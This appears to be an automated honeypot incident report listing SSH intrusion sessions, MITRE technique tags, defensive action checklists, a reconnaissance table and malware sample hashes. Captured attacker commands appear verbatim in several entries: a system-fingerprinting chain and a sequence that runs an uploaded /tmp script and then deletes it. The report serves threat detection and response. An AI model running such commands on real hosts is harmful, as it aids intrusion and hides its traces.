| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:39:30` | `cowrie.session.connect` |
| `2026-08-19 20:39:30` | `cowrie.client.version` |
| `2026-08-19 20:39:30` | `cowrie.client.kex` |
| `2026-08-19 20:39:31` | `cowrie.login.success` |
| `2026-08-19 20:39:32` | `cowrie.session.params` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.success` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:32` | `cowrie.command.input` |
| `2026-08-19 20:39:33` | `cowrie.log.closed` |
| `2026-08-19 20:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c3e0db8600

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 20:42 |
| **Last Seen** | 2026-08-19 20:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:42:12` | `cowrie.session.connect` |
| `2026-08-19 20:42:12` | `cowrie.client.version` |
| `2026-08-19 20:42:12` | `cowrie.client.kex` |
| `2026-08-19 20:42:14` | `cowrie.login.success` |
| `2026-08-19 20:42:16` | `cowrie.session.params` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.success` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:16` | `cowrie.command.input` |
| `2026-08-19 20:42:19` | `cowrie.log.closed` |
| `2026-08-19 20:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dac4c221d56

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:43 |
| **Last Seen** | 2026-08-19 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:43:42` | `cowrie.session.connect` |
| `2026-08-19 20:43:42` | `cowrie.client.version` |
| `2026-08-19 20:43:42` | `cowrie.client.kex` |
| `2026-08-19 20:43:42` | `cowrie.login.success` |
| `2026-08-19 20:43:43` | `cowrie.session.params` |
| `2026-08-19 20:43:43` | `cowrie.command.input` |
| `2026-08-19 20:43:43` | `cowrie.log.closed` |
| `2026-08-19 20:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3908f827409

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 20:44 |
| **Last Seen** | 2026-08-19 20:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:44:53` | `cowrie.session.connect` |
| `2026-08-19 20:44:53` | `cowrie.client.version` |
| `2026-08-19 20:44:53` | `cowrie.client.kex` |
| `2026-08-19 20:44:54` | `cowrie.login.success` |
| `2026-08-19 20:44:56` | `cowrie.session.params` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.success` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.command.input` |
| `2026-08-19 20:44:56` | `cowrie.log.closed` |
| `2026-08-19 20:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff9a5eec5ae

| Field | Detail |
|---|---|
| **Source IP** | `45.84.107[.]128` |
| **First Seen** | 2026-08-19 20:45 |
| **Last Seen** | 2026-08-19 20:46 |
| **Session Duration** | 22s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:45:39` | `cowrie.session.connect` |
| `2026-08-19 20:45:40` | `cowrie.client.version` |
| `2026-08-19 20:45:40` | `cowrie.client.kex` |
| `2026-08-19 20:45:41` | `cowrie.client.fingerprint` |
| `2026-08-19 20:45:41` | `cowrie.login.failed` |
| `2026-08-19 20:45:41` | `cowrie.login.success` |
| `2026-08-19 20:46:01` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:46:02` | `cowrie.direct-tcpip.ja4` |
| `2026-08-19 20:46:02` | `cowrie.direct-tcpip.data` |
| `2026-08-19 20:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.107[.]128` to AbuseIPDB if not already reported
- [ ] Block `45.84.107[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8471fb3cd836

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:49 |
| **Last Seen** | 2026-08-19 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:49:39` | `cowrie.session.connect` |
| `2026-08-19 20:49:39` | `cowrie.client.version` |
| `2026-08-19 20:49:39` | `cowrie.client.kex` |
| `2026-08-19 20:49:39` | `cowrie.login.success` |
| `2026-08-19 20:49:40` | `cowrie.session.params` |
| `2026-08-19 20:49:40` | `cowrie.command.input` |
| `2026-08-19 20:49:40` | `cowrie.log.closed` |
| `2026-08-19 20:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e158a2c7258

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 20:49 |
| **Last Seen** | 2026-08-19 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:49:48` | `cowrie.session.connect` |
| `2026-08-19 20:49:48` | `cowrie.client.version` |
| `2026-08-19 20:49:48` | `cowrie.client.kex` |
| `2026-08-19 20:49:48` | `cowrie.login.success` |
| `2026-08-19 20:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb976e58e7a2

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 20:49 |
| **Last Seen** | 2026-08-19 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:49:50` | `cowrie.session.connect` |
| `2026-08-19 20:49:50` | `cowrie.client.version` |
| `2026-08-19 20:49:50` | `cowrie.client.kex` |
| `2026-08-19 20:49:50` | `cowrie.login.success` |
| `2026-08-19 20:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8626822c488d

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 20:49 |
| **Last Seen** | 2026-08-19 20:52 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:49:54` | `cowrie.session.connect` |
| `2026-08-19 20:49:54` | `cowrie.client.version` |
| `2026-08-19 20:49:54` | `cowrie.client.kex` |
| `2026-08-19 20:49:54` | `cowrie.login.success` |
| `2026-08-19 20:49:55` | `cowrie.session.file_upload` |
| `2026-08-19 20:49:56` | `cowrie.session.params` |
| `2026-08-19 20:49:56` | `cowrie.command.input` |
| `2026-08-19 20:49:56` | `cowrie.command.input` |
| `2026-08-19 20:49:56` | `cowrie.command.input` |
| `2026-08-19 20:49:56` | `cowrie.command.failed` |
| `2026-08-19 20:49:56` | `cowrie.log.closed` |
| `2026-08-19 20:49:57` | `cowrie.session.params` |
| `2026-08-19 20:49:57` | `cowrie.command.input` |
| `2026-08-19 20:49:57` | `cowrie.log.closed` |
| `2026-08-19 20:49:58` | `cowrie.session.params` |
| `2026-08-19 20:49:58` | `cowrie.command.input` |
| `2026-08-19 20:49:58` | `cowrie.log.closed` |
| `2026-08-19 20:49:59` | `cowrie.session.params` |
| `2026-08-19 20:49:59` | `cowrie.command.input` |
| `2026-08-19 20:49:59` | `cowrie.command.failed` |
| `2026-08-19 20:49:59` | `cowrie.command.failed` |
| `2026-08-19 20:50:59` | `cowrie.session.params` |
| `2026-08-19 20:50:59` | `cowrie.command.input` |
| `2026-08-19 20:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe958a5ef65

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 20:50 |
| **Last Seen** | 2026-08-19 20:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:50:21` | `cowrie.session.connect` |
| `2026-08-19 20:50:22` | `cowrie.client.version` |
| `2026-08-19 20:50:22` | `cowrie.client.kex` |
| `2026-08-19 20:50:29` | `cowrie.login.success` |
| `2026-08-19 20:50:33` | `cowrie.session.params` |
| `2026-08-19 20:50:33` | `cowrie.command.input` |
| `2026-08-19 20:50:35` | `cowrie.log.closed` |
| `2026-08-19 20:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28206d7aa85

| Field | Detail |
|---|---|
| **Source IP** | `219.76.191[.]29` |
| **First Seen** | 2026-08-19 20:50 |
| **Last Seen** | 2026-08-19 20:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:50:29` | `cowrie.session.connect` |
| `2026-08-19 20:50:30` | `cowrie.client.version` |
| `2026-08-19 20:50:30` | `cowrie.client.kex` |
| `2026-08-19 20:50:32` | `cowrie.login.success` |
| `2026-08-19 20:50:33` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.76.191[.]29` to AbuseIPDB if not already reported
- [ ] Block `219.76.191[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0c1eed0af1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 20:50 |
| **Last Seen** | 2026-08-19 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:50:35` | `cowrie.session.connect` |
| `2026-08-19 20:50:35` | `cowrie.client.version` |
| `2026-08-19 20:50:36` | `cowrie.client.kex` |
| `2026-08-19 20:50:36` | `cowrie.login.success` |
| `2026-08-19 20:50:37` | `cowrie.session.params` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.success` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.command.input` |
| `2026-08-19 20:50:37` | `cowrie.log.closed` |
| `2026-08-19 20:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78bc5c42d51

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 20:52 |
| **Last Seen** | 2026-08-19 20:54 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:52:00` | `cowrie.session.connect` |
| `2026-08-19 20:52:00` | `cowrie.client.version` |
| `2026-08-19 20:52:00` | `cowrie.client.kex` |
| `2026-08-19 20:52:01` | `cowrie.login.success` |
| `2026-08-19 20:52:02` | `cowrie.session.file_upload` |
| `2026-08-19 20:52:02` | `cowrie.session.params` |
| `2026-08-19 20:52:02` | `cowrie.command.input` |
| `2026-08-19 20:52:02` | `cowrie.command.input` |
| `2026-08-19 20:52:02` | `cowrie.command.input` |
| `2026-08-19 20:52:02` | `cowrie.command.failed` |
| `2026-08-19 20:52:02` | `cowrie.log.closed` |
| `2026-08-19 20:52:03` | `cowrie.session.params` |
| `2026-08-19 20:52:03` | `cowrie.command.input` |
| `2026-08-19 20:52:03` | `cowrie.log.closed` |
| `2026-08-19 20:52:04` | `cowrie.session.params` |
| `2026-08-19 20:52:04` | `cowrie.command.input` |
| `2026-08-19 20:52:04` | `cowrie.log.closed` |
| `2026-08-19 20:52:05` | `cowrie.session.params` |
| `2026-08-19 20:52:05` | `cowrie.command.input` |
| `2026-08-19 20:52:05` | `cowrie.command.failed` |
| `2026-08-19 20:52:05` | `cowrie.command.failed` |
| `2026-08-19 20:53:06` | `cowrie.session.params` |
| `2026-08-19 20:53:06` | `cowrie.command.input` |
| `2026-08-19 20:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **311** | 2026-08-19 18:55 | 2026-08-19 20:55 | 368m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-19 19:06 | 2026-08-19 20:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]191` | **3** | 2026-08-19 20:48 | 2026-08-19 20:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]116` | **3** | 2026-08-19 20:48 | 2026-08-19 20:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]47` | **3** | 2026-08-19 20:47 | 2026-08-19 20:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.239.64[.]84` | **2** | 2026-08-19 20:45 | 2026-08-19 20:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.88.51[.]13` | **2** | 2026-08-19 20:02 | 2026-08-19 20:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.239.95[.]20` | **2** | 2026-08-19 19:12 | 2026-08-19 19:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.95[.]198` | 1 | 2026-08-19 19:10 | 2026-08-19 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-19 20:02 | 2026-08-19 20:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.72.150[.]250` | 1 | 2026-08-19 20:00 | 2026-08-19 20:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `136.119.118[.]84` | 1 | 2026-08-19 19:46 | 2026-08-19 19:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]61` | 1 | 2026-08-19 18:56 | 2026-08-19 18:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]48` | 1 | 2026-08-19 20:43 | 2026-08-19 20:43 | 11s | 0 | `T1592` | 🟢 LOW |
| `190.55.123[.]227` | 1 | 2026-08-19 20:15 | 2026-08-19 20:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.88.120[.]62` | 1 | 2026-08-19 19:21 | 2026-08-19 19:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-08-19 20:21 | 2026-08-19 20:21 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]247` | 1 | 2026-08-19 19:09 | 2026-08-19 19:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-08-19 19:46 | 2026-08-19 19:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-08-19 20:35 | 2026-08-19 20:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.159[.]192` | 1 | 2026-08-19 18:55 | 2026-08-19 18:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.55[.]86` | 1 | 2026-08-19 19:25 | 2026-08-19 19:25 | 32s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-19 19:50 | 2026-08-19 19:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-19 19:44 | 2026-08-19 19:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]10` | 1 | 2026-08-19 20:10 | 2026-08-19 20:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]4` | 1 | 2026-08-19 20:23 | 2026-08-19 20:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-19 19:38 | 2026-08-19 19:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-08-19 20:32 | 2026-08-19 20:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.53.143[.]241` | 1 | 2026-08-19 19:36 | 2026-08-19 19:37 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
